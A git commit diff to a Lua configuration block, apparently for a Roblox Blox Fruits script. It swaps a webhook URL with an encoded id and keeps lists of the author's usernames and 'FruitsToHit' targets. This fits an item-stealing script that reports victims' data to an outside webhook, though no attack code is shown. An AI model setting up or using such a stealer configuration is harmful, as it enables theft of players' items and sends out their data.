3467f65e1da0b1495dcb908e98da2b209d64e130
Ammar-u <ashiramir27@gmail.com>
2025-04-13 16:08:32 +0500

    Update ...lua

--- ...lua
+++ ...lua
@@ -1,4 +1,4 @@
-Webhook = ""https://webhook-protect.vercel.app/api/webhook?id=N2hnUDMtaXdKX1hWUW5MZUYxeDNLZzpwTEVrclpPMmlBa2xzM25hMDNfMHZBMk1FVnJwQldvOF9PTkpUN0JpSFZfdEJiVmx5SjAxVkZET1M1dXFtZHhyZTIzT24wbEd3Sk45eVg1dTY0MW1ubEpJN2lDdUJST1BsRmV1RjFHSXNwel8wZXNuM0VfZGthU1pKS2V3NTJJaEllUmFYSGQ0UklIZE9UalJnMHlPT3JVT1pfbU8zQWVWYllrbC0wOGo5X2c
+webhook = "https://webhook-protect.vercel.app/api/webhook?id=N2hnUDMtaXdKX1hWUW5MZUYxeDNLZzpwTEVrclpPMmlBa2xzM25hMDNfMHZBMk1FVnJwQldvOF9PTkpUN0JpSFZfdEJiVmx5SjAxVkZET1M1dXFtZHhyZTIzT24wbEd3Sk45eVg1dTY0MW1ubEpJN2lDdUJST1BsRmV1RjFHSXNwel8wZXNuM0VfZGthU1pKS2V3NTJJaEllUmFYSGQ0UklIZE9UalJnMHlPT3JVT1pfbU8zQWVWYllrbC0wOGo5X2c
 Usernames = {"Ammar_Ronaldo96", "Ammar_Ronaldo96"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
